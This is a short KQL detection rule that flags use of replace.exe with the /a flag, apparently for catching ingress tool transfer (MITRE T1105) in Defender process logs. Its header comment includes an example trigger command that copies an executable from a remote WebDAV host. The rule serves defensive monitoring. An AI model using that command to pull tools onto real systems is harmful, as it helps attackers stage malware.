// Title: Using Replace.exe to download or copy files
// Desc: Detects the use of Replace.exe which can be used to replace file with another file
// Ref - Using Replace.exe to download or copy files
// Ref - https://www.freebuf.com/articles/system/232074.html
// MITRE: https://attack.mitre.org/techniques/T1105/ (Command and Control: Ingress Tool Transfer)
// Severity: medium
// Trigger: replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
// Usecase: Copy files & Download files
// https://github.com/SigmaHQ/sigma/blob/master/rules/windows/proc_creation_win_lolbin_replace.yml
// By: Frankie Li
// On: 15-05-2023
DeviceProcessEvents 
| where (FolderPath endswith @'\replace.exe' 
    and (ProcessCommandLine contains @'/a' or ProcessCommandLine contains @'-a'))
| project Timestamp, DeviceName, AccountName, InitiatingProcessParentFileName, FolderPath, ProcessCommandLine